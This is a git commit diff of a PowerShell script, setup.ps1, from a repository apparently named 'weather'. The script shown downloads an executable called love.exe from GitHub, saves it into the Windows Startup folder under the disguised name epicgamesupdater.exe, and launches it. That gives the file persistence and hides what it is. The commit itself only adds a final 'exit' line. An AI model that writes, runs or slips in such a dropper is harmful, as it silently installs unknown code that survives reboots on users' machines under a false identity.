aae283eb6482bca8caba3b91ba54df25146ff0b9
FCsab <161705557+FCsab@users.noreply.github.com>
2025-12-12 21:44:01 +0100

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -2,4 +2,4 @@ $url = "https://github.com/FCsab/weather/blob/main/love.exe?raw=true"
 $dest = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\epicgamesupdater.exe"
 Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
 Start-Process -FilePath $dest
-
+exit
